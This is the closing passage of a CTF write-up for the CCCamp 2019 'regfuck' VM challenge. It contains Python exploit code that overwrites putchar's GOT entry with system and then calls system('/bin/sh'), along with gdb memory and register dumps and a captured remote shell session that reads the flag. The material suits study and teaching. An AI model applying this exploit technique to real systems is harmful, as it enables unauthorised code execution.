+    <span class="c1"># 6. reset array index (for following loops)
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">setarrayidx</span><span class="p">()</span>        <span class="c1"># on ip cell
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">movacc</span><span class="p">()</span>             <span class="c1"># store eip in acc
+</span>
+    <span class="c1"># 7. move to destination address
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">decidx</span><span class="p">(</span> <span class="p">((</span><span class="mh">0x404000</span><span class="o">+</span><span class="n">rbp_off</span><span class="p">)</span> <span class="o">-</span> <span class="n">address</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span>
+
+    <span class="c1"># 8. increase / decrease value
+</span>    <span class="k">if</span> <span class="n">increase</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">incval</span><span class="p">(</span><span class="n">factor</span><span class="p">)</span>   <span class="c1"># increase value by x
+</span>    <span class="k">else</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">decval</span><span class="p">(</span><span class="n">factor</span><span class="p">)</span>   <span class="c1"># decrease value by x
+</span>
+    <span class="c1"># 9. go back to multiplicator and decrease it
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">incidx</span><span class="p">(</span> <span class="p">((</span><span class="mh">0x404000</span><span class="o">+</span><span class="n">rbp_off</span><span class="p">)</span> <span class="o">-</span> <span class="n">address</span> <span class="o">+</span> <span class="mi">4</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">decval</span><span class="p">()</span>
+
+    <span class="c1"># 10. repeat until multiplier == 0
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">jnz</span><span class="p">()</span>
+
+    <span class="c1"># 11. add remaining value
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">decidx</span><span class="p">()</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">decidx</span><span class="p">(((</span><span class="mh">0x404000</span><span class="o">+</span><span class="n">rbp_off</span><span class="p">)</span> <span class="o">-</span> <span class="n">address</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="n">increase</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">incval</span><span class="p">(</span><span class="n">remaining</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="n">payload</span> <span class="o">+=</span> <span class="n">decval</span><span class="p">(</span><span class="n">remaining</span><span class="p">)</span>
+
+    <span class="c1"># 12. go back to original context
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">incidx</span><span class="p">(</span> <span class="p">((</span><span class="mh">0x404000</span> <span class="o">+</span> <span class="n">rbp_off</span><span class="p">)</span> <span class="o">-</span> <span class="n">address</span><span class="p">)</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span>
+    <span class="n">payload</span> <span class="o">+=</span> <span class="n">incidx</span><span class="p">(</span> <span class="p">((</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="n">rbp_off</span> <span class="o">+</span> <span class="mi">8</span><span class="p">))</span> <span class="o">/</span> <span class="mi">4</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">payload</span>
+
+<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">r</span><span class="p">):</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">LOCAL</span><span class="p">:</span>
+        <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"stdin..</span><span class="se">\n\n</span><span class="s">"</span><span class="p">)</span>
+    
+    <span class="n">payload</span> <span class="o">=</span> <span class="s">""</span>
+        
+    <span class="c1"># call putchar to resolve it
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">putchar</span><span class="p">()</span>
+
+    <span class="c1"># overwrite putchar with system
+</span>    <span class="n">payload</span> <span class="o">+=</span> <span class="n">write_value</span><span class="p">(</span><span class="mh">0x404018</span><span class="p">,</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"putchar"</span><span class="p">],</span> <span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">],</span> <span class="mh">0x68</span><span class="p">)</span></code></pre></figure>
+
+<p>Since the regfuck code might not be too easy to understand at this point, some more details, what’s happening in memory:</p>
+
+<ul>
+  <li>1 - Creating fake index in data context</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x405000:	0x0000000000000006	0x00000000fffffc18  &lt;= Opcode+Accumulator / Cell 0
+0x405010:	0x0000000000000000	0x0000000000000000
+0x405020:	0x0000000000000000	0x0000000000000000
+0x405030:	0x0000000000000000	0x0000000000000000
+0x405040:	0x0000000000000000	0x0000000000000000
+0x405050:	0x0000000000000000	0x0000000000000000
+0x405060:	0x0000000000000000	0x0000000000000000
+0x405070:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<ul>
+  <li>2 - Moving fake index to accumulator</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x405000:	0xfffffc1800000009	0x00000000fffffc18  &lt;= Opcode+Accumulator / Cell 0
+0x405010:	0x0000000000000000	0x0000000000000000
+0x405020:	0x0000000000000000	0x0000000000000000
+0x405030:	0x0000000000000000	0x0000000000000000
+0x405040:	0x0000000000000000	0x0000000000000000
+0x405050:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<ul>
+  <li>3 - Set the array index to accumulator</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x7ffdfbcdaab4:	0x0000   # current cell index before
+0x7ffdfbcdaab4:	0xfc18   # current cell index after</code></pre></figure>
+
+<ul>
+  <li>4 - Move one cell up and write a “multiplicator” value there</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x404000:	0x0000000000403e10	0x00007ff40abbb170  &lt;= bss
+0x404010:	0x00007ff40a9a9680	0x00007ff40a420810  &lt;= dl_resolve / putchar.got
+0x404020:	0x00007ff40a41e9c0	0x0000000000401056
+0x404030:	0x00007ff40a4b99d0	0x00007ff40a790070
+0x404040:	0x00007ffdfbd21f10	0x0000000000401096
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060:	0x0000000000000000	0x0000050700000000  &lt;= multiplicator
+0x404070:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<ul>
+  <li>5 - Move back and store the current instruction pointer (and current cell value) to this cell</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x404000:	0x0000000000403e10	0x00007ff40abbb170
+0x404010:	0x00007ff40a9a9680	0x00007ff40a420810
+0x404020:	0x00007ff40a41e9c0	0x0000000000401056
+0x404030:	0x00007ff40a4b99d0	0x00007ff40a790070
+0x404040:	0x00007ffdfbd21f10	0x0000000000401096
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060:	0x0000000000000000	0x0000050727cafc18  &lt;= multiplicator + stored vm_ip
+0x404070:	0x0000000000000000	0x0000000000000000
+0x404080:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<ul>
+  <li>6 - Reset index array</li>
+  <li>7 - Move cell pointer to our destination address (<code class="language-plaintext highlighter-rouge">putchar.got</code>)</li>
+  <li>8 - Increase/Decrease it by a “factor” value</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x404000:	0x0000000000403e10	0x00007ff40abbb170
+0x404010:	0x00007ff40a9a9680	0x00007ff40a42076d  &lt;= dl_resolve / putchar.got (modified by factor)
+0x404020:	0x00007ff40a41e9c0	0x0000000000401056
+0x404030:	0x00007ff40a4b99d0	0x00007ff40a790070
+0x404040:	0x00007ffdfbd21f10	0x0000000000401096
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060:	0x0000000000000000	0x0000050727cafc18</code></pre></figure>
+
+<ul>
+  <li>9 - Move back to our multiplicator value and decrease it by 1</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x404000:	0x0000000000403e10	0x00007ff40abbb170
+0x404010:	0x00007ff40a9a9680	0x00007ff40a42076d  
+0x404020:	0x00007ff40a41e9c0	0x0000000000401056
+0x404030:	0x00007ff40a4b99d0	0x00007ff40a790070
+0x404040:	0x00007ffdfbd21f10	0x0000000000401096
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060:	0x0000000000000000	0x0000050627cafc18  &lt;= multiplicator decreased</code></pre></figure>
+
+<ul>
+  <li>10 - Do a “jump if not zero” (multiplicator value) back to the stored instruction pointer</li>
+</ul>
+
+<p>After some repetitions</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x404000:	0x0000000000403e10	0x00007ff40abbb170
+0x404010:	0x00007ff40a9a9680	0x00007ff40a41f26a  &lt;= putchar.got repeatedly decreased
+0x404020:	0x00007ff40a41e9c0	0x0000000000401056
+0x404030:	0x00007ff40a4b99d0	0x00007ff40a790070
+0x404040:	0x00007ffdfbd21f10	0x0000000000401096
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060:	0x0000000000000000	0x000004e527cafc18  &lt;= multiplicator decreased
+0x404070:	0x0000000000000000	0x0000000000000000</code></pre></figure>
+
+<p>Until multiplicator hits zero and we’ll jump out of the loop</p>
+
+<ul>
+  <li>11 - Walk back to the destination address and increase/decrease it by the “remaining” value</li>
+</ul>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  x/30gx 0x404000
+0x404000:	0x0000000000403e10	0x00007ff40abbb170
+0x404010:	0x00007ff40a9a9680	0x00007ff40a3ed440  &lt;= putchar.got now pointing to system
+0x404020:	0x00007ff40a41e9c0	0x0000000000401056
+0x404030:	0x00007ff40a4b99d0	0x00007ff40a790070
+0x404040:	0x00007ffdfbd21f10	0x0000000000401096
+0x404050:	0x0000000000000000	0x0000000000000000
+0x404060:	0x0000000000000000	0x0000000027cafc18  &lt;= multiplicator 0
+0x404070:	0x0000000000000000	0x0000000000000000
+0x404080:	0x0000000000000000	0x0000000000000000
+0x404090:	0x0000000000000000	0x0000000000000000
+0x4040a0:	0x0000000000000000	0x0000000000000000
+0x4040b0:	0x0000000000000000	0x0000000000000000
+0x4040c0:	0x0000000000000000	0x0000000000000000
+0x4040d0:	0x0000000000000000	0x0000000000000000
+0x4040e0:	0x0000000000000000	0x0000000000000000
+gef➤  x/10i 0x00007ff40a3ed440
+   0x7ff40a3ed440 &lt;__libc_system&gt;:	test   rdi,rdi
+   0x7ff40a3ed443 &lt;__libc_system+3&gt;:	je     0x7ff40a3ed450 &lt;__libc_system+16&gt;
+   0x7ff40a3ed445 &lt;__libc_system+5&gt;:	jmp    0x7ff40a3eceb0 &lt;do_system&gt;
+   0x7ff40a3ed44a &lt;__libc_system+10&gt;:	nop    WORD PTR [rax+rax*1+0x0]</code></pre></figure>
+
+<p>So, at this point, putchar is now pointing to <code class="language-plaintext highlighter-rouge">system</code>. A <code class="language-plaintext highlighter-rouge">/bin/sh</code> string and a pointer to it at a known address, is all we need now to do a proper <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>. At first, I thought about also increasing values to forge the pointer and the address, but…</p>
+
+<p>We can just append them to the end of our program code, which makes this last step much easier ;)</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">data</span> <span class="o">=</span> <span class="n">convertprogram</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Append pointer to /bin/sh and /bin/sh string to program code
+</span><span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">2408</span><span class="p">,</span> <span class="s">"A"</span><span class="p">)</span>
+<span class="n">data</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x405c90</span><span class="p">)</span>			<span class="c1"># pointer to /bin/sh
+</span><span class="n">data</span> <span class="o">+=</span> <span class="s">"/bin/sh"</span>			
+
+<span class="n">program</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>
+<span class="n">program</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">program</span> <span class="o">+=</span> <span class="n">data</span></code></pre></figure>
+
+<p>This way, we know that we’ll have a pointer to the string at <code class="language-plaintext highlighter-rouge">0x405c88</code> (and <code class="language-plaintext highlighter-rouge">/bin/sh</code> at <code class="language-plaintext highlighter-rouge">0x405c90</code>). So we just need to get the current cell index point to the cell <code class="language-plaintext highlighter-rouge">0x405c88 - 0x405008</code> and trigger <code class="language-plaintext highlighter-rouge">putchar</code>.</p>
+
+<p>But, we cannot just increase the cell index multiple times (because every increase would increase the program size and move our values further down, by which we’d end up in an endless catchup game).</p>
+
+<p>In the end, I just did the same as for increasing the got entry multiple times and wrote another short vm code, which will create the needed array index, pointing to the <code class="language-plaintext highlighter-rouge">/bin/sh</code> pointer and set it via <code class="language-plaintext highlighter-rouge">set array index</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c1"># move to /bin/sh and call putchar to trigger system
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">incval</span><span class="p">(</span><span class="mh">0x3e8</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">movacc</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">setarrayidx</span><span class="p">()</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">incidx</span><span class="p">()</span>				<span class="c1"># cell 1
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">incval</span><span class="p">(</span><span class="mh">0x20</span><span class="p">)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">decidx</span><span class="p">()</span>				<span class="c1"># cell 0
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">storeeip</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>		<span class="c1"># stored ip in 0
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">setarrayidx</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">movacc</span><span class="p">()</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">incidx</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>			<span class="c1"># cell 2
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">incval</span><span class="p">(</span><span class="mi">25</span><span class="p">)</span>	
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">decidx</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>			<span class="c1"># cell 1
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">decval</span><span class="p">()</span>				<span class="c1"># decrease counter
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">jnz</span><span class="p">()</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">incidx</span><span class="p">()</span>				<span class="c1"># cell 2
+</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">movacc</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">setarrayidx</span><span class="p">()</span>		<span class="c1"># move cell to /bin/sh ptr
+</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">putchar</span><span class="p">()</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">putchar</span><span class="p">()</span></code></pre></figure>
+
+<p>After this, <code class="language-plaintext highlighter-rouge">putchar</code> is triggered</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gef➤  
+──────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0000000000405c90  →  0x0068732f6e69622f ("/bin/sh"?)
+$rbx   : 0x0               
+$rcx   : 0x5               
+$rdx   : 0xc88             
+$rsp   : 0x00007ffdfbcdaa50  →  0x0000000000000000
+$rbp   : 0x00007ffdfbcdaa80  →  0x00007ffdfbcdaad0  →  0x00007ffdfbcdab10  →  0x0000000000401630  →   endbr64 
+$rsi   : 0xfffffffe        
+$rdi   : 0x0000000000405c90  →  0x0068732f6e69622f ("/bin/sh"?)
+$rip   : 0x0000000000401386  →   call 0x401030 &lt;putchar@plt&gt;
+$r8    : 0x30              
+$r9    : 0x00007ff40aba0740  →  0x00007ff40aba0740  →  [loop detected]
+$r10   : 0x5               
+$r11   : 0x00007ff40a420810  →  0x0036a0301d8b4853
+$r12   : 0x00000000004010a0  →   endbr64 
+$r13   : 0x00007ffdfbcdabf0  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+─────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x40137f                  add    rax, rdx
+     0x401382                  mov    eax, DWORD PTR [rax]
+     0x401384                  mov    edi, eax
+ →   0x401386                  call   0x401030 &lt;putchar@plt&gt;
+   ↳    0x401030 &lt;putchar@plt+0&gt;  jmp    QWORD PTR [rip+0x2fe2]        # 0x404018
+        0x401036 &lt;putchar@plt+6&gt;  push   0x0
+        0x40103b &lt;putchar@plt+11&gt; jmp    0x401020
+        0x401040 &lt;puts@plt+0&gt;     jmp    QWORD PTR [rip+0x2fda]        # 0x404020
+        0x401046 &lt;puts@plt+6&gt;     push   0x1
+        0x40104b &lt;puts@plt+11&gt;    jmp    0x401020
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffdfbcdaa50│+0x0000: 0x0000000000000000	 ← $rsp
+0x00007ffdfbcdaa58│+0x0008: 0x0000003000000000
+0x00007ffdfbcdaa60│+0x0010: 0x00007ffdfbcdaab4  →  0x5d628cbb465a0320
+0x00007ffdfbcdaa68│+0x0018: 0x00007ffdfbcdaab6  →  0x00005d628cbb465a
+0x00007ffdfbcdaa70│+0x0020: 0x0000000000405320  →  0xbdf7de7befbdf7fe
+0x00007ffdfbcdaa78│+0x0028: 0x0000000000405000  →  0x0000032000000007
+──────────────────────────────────────────────────────────────────────────────────────────────────── arguments (guessed) ────
+putchar@plt (
+   $rdi = 0x0000000000405c90 → 0x0068732f6e69622f ("/bin/sh"?),
+   $rsi = 0x00000000fffffffe,
+   $rdx = 0x0000000000000c88,
+   $rcx = 0x0000000000000005
+)
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+0x0000000000401386 in ?? ()</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">rdi</code> holding <code class="language-plaintext highlighter-rouge">0x405c90</code> pointing to our <code class="language-plaintext highlighter-rouge">/bin/sh</code> string and now happily triggering <code class="language-plaintext highlighter-rouge">system</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">─────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$rax   : 0x0000000000405c90  →  0x0068732f6e69622f ("/bin/sh"?)
+$rbx   : 0x0               
+$rcx   : 0x5               
+$rdx   : 0xc88             
+$rsp   : 0x00007ffdfbcdaa48  →  0x000000000040138b  →   jmp 0x401406
+$rbp   : 0x00007ffdfbcdaa80  →  0x00007ffdfbcdaad0  →  0x00007ffdfbcdab10  →  0x0000000000401630  →   endbr64 
+$rsi   : 0xfffffffe        
+$rdi   : 0x0000000000405c90  →  0x0068732f6e69622f ("/bin/sh"?)
+$rip   : 0x00007ff40a3ed440  →  0xfa66e90b74ff8548
+$r8    : 0x30              
+$r9    : 0x00007ff40aba0740  →  0x00007ff40aba0740  →  [loop detected]
+$r10   : 0x5               
+$r11   : 0x00007ff40a420810  →  0x0036a0301d8b4853
+$r12   : 0x00000000004010a0  →   endbr64 
+$r13   : 0x00007ffdfbcdabf0  →  0x0000000000000001
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [zero carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+   0x7ff40a3ed435 &lt;cancel_handler+213&gt; add    BYTE PTR [rax], 0x0
+   0x7ff40a3ed438 &lt;cancel_handler+216&gt; add    BYTE PTR [rbx-0x3d], bl
+   0x7ff40a3ed43b                  nop    DWORD PTR [rax+rax*1+0x0]
+ → 0x7ff40a3ed440 &lt;system+0&gt;       test   rdi, rdi
+   0x7ff40a3ed443 &lt;system+3&gt;       je     0x7ff40a3ed450 &lt;__libc_system+16&gt;
+   0x7ff40a3ed445 &lt;system+5&gt;       jmp    0x7ff40a3eceb0 &lt;do_system&gt;
+   0x7ff40a3ed44a &lt;system+10&gt;      nop    WORD PTR [rax+rax*1+0x0]
+   0x7ff40a3ed450 &lt;system+16&gt;      lea    rdi, [rip+0x164a4b]        # 0x7ff40a551ea2
+   0x7ff40a3ed457 &lt;system+23&gt;      sub    rsp, 0x8
+──────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007ffdfbcdaa48│+0x0000: 0x000000000040138b  →   jmp 0x401406	 ← $rsp
+0x00007ffdfbcdaa50│+0x0008: 0x0000000000000000
+0x00007ffdfbcdaa58│+0x0010: 0x0000003000000000
+0x00007ffdfbcdaa60│+0x0018: 0x00007ffdfbcdaab4  →  0x5d628cbb465a0320
+0x00007ffdfbcdaa68│+0x0020: 0x00007ffdfbcdaab6  →  0x00005d628cbb465a
+0x00007ffdfbcdaa70│+0x0028: 0x0000000000405320  →  0xbdf7de7befbdf7fe</code></pre></figure>
+
+<p>Fortunately, this didn’t have the problems anymore like the <code class="language-plaintext highlighter-rouge">one_gadget</code> approach and also resulted in a shell when running remote :)</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">$ python work.py 1
+[*] '/media/sf_ctf/alles/regfuck/regfuck/vm'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/media/sf_ctf/alles/regfuck/regfuck/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to hax.allesctf.net on port 3301: Done
+[*] Switching to interactive mode
+$ id
+uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+$ cat flag
+ALLES{5w337_dr34m5_4r3_m4d3_0f_7h15}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=CCCamp 2019 CTF - regfuck&amp;url=https://kileak.github.io/ctf/2019/ccccamp-regfuck/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2019/ccccamp-regfuck/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2019/ccccamp-regfuck';
+        var disqus_title = 'CCCamp 2019 CTF - regfuck';
+        var disqus_url = 'https://kileak.github.io/ctf/2019/ccccamp-regfuck';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
